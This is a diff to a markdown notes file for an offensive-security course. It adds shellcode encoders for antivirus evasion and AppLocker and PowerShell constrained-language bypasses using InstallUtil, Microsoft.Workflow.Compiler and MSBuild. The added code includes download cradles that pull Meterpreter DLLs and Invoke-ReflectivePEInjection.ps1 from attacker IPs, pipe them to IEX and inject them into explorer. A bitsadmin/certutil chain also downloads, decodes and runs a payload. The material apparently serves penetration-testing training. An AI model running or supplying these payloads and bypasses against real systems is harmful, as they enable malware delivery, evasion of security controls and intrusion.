@@ -395,6 +395,7 @@ var r = new ActiveXObject("WScript.Shell").Run("met.exe");
 Modify the Jscript code to make it proxy-aware with the **setProxy** method
 
 ### run2.js
+
 ```js
 var url = "http://192.168.119.120/shell.exe"
 var Object = WScript.CreateObject("MSXML2.ServerXMLHTTP");
@@ -574,6 +575,7 @@ namespace ShellcodeRunner
 
 ```csharp
 using System;
+using System.Diagnostics;
 using System.Runtime.InteropServices;
 
 [ComVisible(true)]
@@ -940,6 +942,8 @@ namespace DLLInjection
 
 ## Reflective DLL Injection in PowerShell
 
+Inject an unmanaged Meterpreter DLL into a process
+
 ```pwsh
 $bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.179/met.dll')
 $procid = (Get-Process -Name explorer).Id
@@ -1221,6 +1225,57 @@ namespace Helper
         }
     }
 }
+```
+
+#### helper.py
+
+`python helper.py <msfvenom-generated csharp shellcode file>`
+
+```python
+import sys
+import requests
+import re
+
+def main():
+    # Check if the correct number of command-line arguments is provided
+    if len(sys.argv) != 2:
+        print("Please provide filename as command-line arguments.")
+        return
+
+    url = f"http://127.0.0.1/{sys.argv[1]}"
+
+    try:
+        # Download the file content as a string directly into memory
+        response = requests.get(url)
+        response.raise_for_status()  # Raise an error for bad responses
+        declaration = response.text.strip()
+
+        # Use a regex to extract the byte values
+        match = re.search(r'new byte\[\d+\] \{(.*?)\};', declaration, re.DOTALL)
+
+        if match:
+            byte_values = match.group(1)
+            hex_array = byte_values.split(',')
+
+            # Create the byte array with the dynamic size based on the number of hex values
+            buf = bytearray()
+
+            for hex_value in hex_array:
+                # Convert each hex string to a byte
+                buf.append(int(hex_value.strip(), 16))
+
+            # Encode the bytes
+            encoded = bytearray((b ^ 0xfa) for b in buf)
+
+            hex_representation = ', '.join(f"0x{b:02x}" for b in encoded)
+            print(f"byte[] buf = new byte[{len(buf)}] {{{hex_representation}}};")
+        else:
+            print("The file does not contain a valid byte array declaration.")
+    except Exception as ex:
+        print(f"Error reading file: {ex}")
+
+if __name__ == "__main__":
+    main()
 ```
 
 Hardcode the shellcode
@@ -1627,6 +1682,8 @@ namespace BypassingAntivirus
 
 ### Encrypt the shellcode
 
+Hardcode the shellcode
+
 ```csharp
 using System;
 using System.Text;
@@ -1664,6 +1721,149 @@ namespace Helper
         }
     }
 }
+```
+
+#### helper2.exe
+
+`helper2.exe <Kali IP> <msfvenom-generated csharp shellcode file>`
+
+```csharp
+using System;
+using System.Text;
+using System.Net.Http;
+using System.Text.RegularExpressions;
+
+namespace Helper
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            // Check if a URL was provided
+            if (args.Length != 2)
+            {
+                Console.WriteLine("Please provide the IP and filename as command-line arguments.");
+                return;
+            }
+
+            string url = "http://" + args[0] + "/" + args[1];
+
+            try
+            {
+                using (HttpClient client = new HttpClient())
+                {
+                    // Download the file content as a string directly into memory
+                    string declaration = client.GetStringAsync(url).Result; // Blocking call
+                    declaration = declaration.Trim();
+
+                    // Use a regex to extract the byte values
+                    //var match = Regex.Match(declaration, @"new byte\[\d+\] \{(.*?)\};");
+                    var match = Regex.Match(declaration, @"new byte\[\d+\] \{(.*?)\};", RegexOptions.Singleline);
+
+                    if (match.Success)
+                    {
+                        string byteValues = match.Groups[1].Value;
+                        string[] hexArray = byteValues.Split(',');
+
+                        // Create the byte array with the dynamic size based on the number of hex values
+                        byte[] buf = new byte[hexArray.Length];
+
+                        for (int i = 0; i < hexArray.Length; i++)
+                        {
+                            // Convert each hex string to a byte
+                            buf[i] = Convert.ToByte(hexArray[i].Trim(), 16);
+                        }
+
+                        byte[] encoded = new byte[buf.Length];
+                        for (int i = 0; i < buf.Length; i++)
+                        {
+                            encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
+                        }
+
+                        uint counter = 0;
+
+                        StringBuilder hex = new StringBuilder(encoded.Length * 2);
+
+                        foreach (byte b in encoded)
+                        {
+                            if (counter != encoded.Length - 1)
+                                hex.AppendFormat("{0:D}, ", b);
+                            else
+                                hex.AppendFormat("{0:D}", b);
+                            counter++;
+                            if (counter % 50 == 0)
+                            {
+                                hex.AppendFormat("_{0}", Environment.NewLine);
+                            }
+                        }
+                        Console.WriteLine("buf = Array(" + hex.ToString() + ")");
+                    }
+                    else
+                    {
+                        Console.WriteLine("The file does not contain a valid byte array declaration.");
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Error reading file: {ex.Message}");
+            }
+        }
+    }
+}
+```
+
+#### helper2.py
+
+`python helper2.py <msfvenom-generated csharp shellcode file>`
+
+```python
+import sys
+import requests
+import re
+
+def main():
+    # Check if an IP and filename were provided
+    if len(sys.argv) != 2:
+        print("Please provide filename as command-line arguments.")
+        return
+
+    url = f"http://127.0.0.1/{sys.argv[1]}"
+
+    try:
+        # Download the file content as a string directly into memory
+        response = requests.get(url)
+        response.raise_for_status()  # Raise an error for bad responses
+        declaration = response.text.strip()
+
+        # Use a regex to extract the byte values
+        match = re.search(r'new byte\[\d+\] \{(.*?)\};', declaration, re.DOTALL)
+
+        if match:
+            byte_values = match.group(1)
+            hex_array = byte_values.split(',')
+
+            # Create the byte array with the dynamic size based on the number of hex values
+            buf = bytearray(int(val.strip(), 16) for val in hex_array)
+
+            # Encode the byte values
+            encoded = bytearray((b + 2) & 0xFF for b in buf)
+
+            # Format the output
+            hex_output = []
+            for i, b in enumerate(encoded):
+                hex_output.append(str(b))
+                if (i + 1) % 50 == 0:
+                    hex_output.append('_\n')
+            output = "buf = Array(" + ", ".join(hex_output) + ")"
+            print(output)
+        else:
+            print("The file does not contain a valid byte array declaration.")
+    except Exception as ex:
+        print(f"Error reading file: {ex}")
+
+if __name__ == "__main__":
+    main()
 ```
 
 ```VB
@@ -2240,17 +2440,25 @@ catch(e)
 
 ### Trusted Folders
 
+Locate user-writable folders
+
 ```bat
 accesschk.exe "student" C:\Windows -wus
+```
 
+```bat
 icacls.exe C:\Windows\Tasks
 ```
 
 ### Bypass With DLLs
 
+The default ruleset doesn't protect against loading arbitrary DLLs
+
 ```bat
 rundll32 C:\Tools\TestDll.dll,run
 ```
+
+This code has already been compiled and saved as `C:\Tools\TestDll.dll` on the Windows 10 victim VM.
 
 ```C
 #include "stdafx.h"
@@ -2291,7 +2499,11 @@ TeamViewer version 12 uses a log file (`TeamViewer12_Logfile.log`) that is both 
 
 ```bat
 type test.js > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
+```
 
+Verify that the Jscript code was written to the alternate data stream
+
+```bat
 dir /r "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log"
 ```
 
@@ -2314,6 +2526,10 @@ $ExecutionContext.SessionState.LanguageMode
 ```
 
 ### Custom Runspaces
+
+Allow arbitrary PowerShell execution
+
+`Bypass.exe`
 
 ```csharp
 using System;
@@ -2341,7 +2557,21 @@ namespace Bypass
 }
 ```
 
+```bat
+C:\Windows\Tasks\Bypass.exe
+type C:\Tools\test.txt
+```
+
 ### PowerShell CLM Bypass
+
+Leverage InstallUtil, a command-line utility that allows us to install and uninstall server resources by executing the installer components in a specified assembly. We can abuse it to execute arbitrary C# code.
+
+To use InstallUtil in this way, we must put the code we want to execute inside either the install or uninstall methods of the installer class.
+We are only going to use the uninstall method since the install method requires administrative privileges to execute.
+
+The System.Configuration.Install namespace is missing an assembly reference in Visual Studio. We can add this by again right-clicking on References in the Solution Explorer and choosing Add References.... From here, we'll navigate to the Assemblies menu on the left-hand side and scroll down to System.Configuration.Install.
+
+We enabled AppLocker DLL rules to block untrusted DLLs. Leverage InstallUtil to bypass AppLocker and revive the powerful reflective DLL injection technique.
 
 ```csharp
 using System;
@@ -2370,6 +2600,8 @@ namespace Bypass
             PowerShell ps = PowerShell.Create();
             ps.Runspace = rs;
 
+            //String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
+
             String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.45.183/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
 
             ps.AddScript(cmd);
@@ -2384,6 +2616,14 @@ namespace Bypass
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Tools\Bypass.exe
 ```
 
+At this point, it would be possible to reuse this tradecraft with the Microsoft Word macros we developed in a previous module since they are not limited by AppLocker. Instead of using WMI to directly start a PowerShell process and download the shellcode runner from our Apache web server, we could make WMI execute InstallUtil and obtain the same result despite AppLocker.
+
+The issue is that **the compiled C# file has to be on disk when InstallUtil is invoked**. We must download an executable, and ensure that it is not flagged by antivirus, neither during the download process nor when it is saved to disk.
+
+To attempt to bypass anitvirus, we are going to obfuscate the executable while it is being downloaded with Base64 encoding and then decode it on disk.
+
+Well use the native **certutil** tool to perform the encoding and decoding and **bitsadmin** for the downloading.
+
 ```bat
 certutil -encode C:\Users\Offsec\source\repos\Bypass\Bypass\bin\x64\Release\Bypass.exe file.txt
 
@@ -2392,17 +2632,16 @@ bitsadmin /Transfer myJob http://192.168.119.120/file.txt C:\Users\student\enc.t
 certutil -decode enc.txt Bypass.exe
 ```
 
-### Reflective Injection Returns
-
-```pwsh
-String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
+```bat
+C:\Users\student>bitsadmin /Transfer myJob http://192.168.119.120/file.txt C:\users\student\enc.txt && certutil -decode C:\users\student\enc.txt C:\users\student\Bypass.exe && del C:\users\student\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\student\Bypass.exe
 ```
 
 ## Bypassing AppLocker with C#
 
 ### Microsoft.Workflow.Compiler
 
-`test.txt`
+Craft a file `test.txt` containing C# code, which implements a class that inherits from the Activity class and has a constructor. The file path must be inserted into the XML document along with compiler parameters organized in a serialized format.
+
 ```csharp
 using System;
 using System.Workflow.ComponentModel;
@@ -2412,6 +2651,8 @@ public class Run : Activity{
     }
 }
 ```
+
+Create this correctly-serialized XML format `run.xml`
 
 ```pwsh
 $workflowexe = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe"
@@ -2433,10 +2674,15 @@ $Acl = Get-ACL $output;$AccessRule= New-Object System.Security.AccessControl.Fil
 C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe run.xml results.xml
 ```
 
+The downside to this attack is that we must provide both the XML file and the C# code file on disk, and the C# code file will be compiled temporarily to disk as well.
+
 ### MSbuild
 
-`T1127.001.csproj`
-```
+`https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1127.001/T1127.001.md`
+
+Executes the code in a project file using `msbuild.exe`. The default C# project example file (`T1127.001.csproj`) will simply print "Hello From a Code Fragment" and "Hello From a Class." to the screen.
+
+```xml
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
   <!-- This inline task executes c# code. -->
   <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildBypass.csproj -->
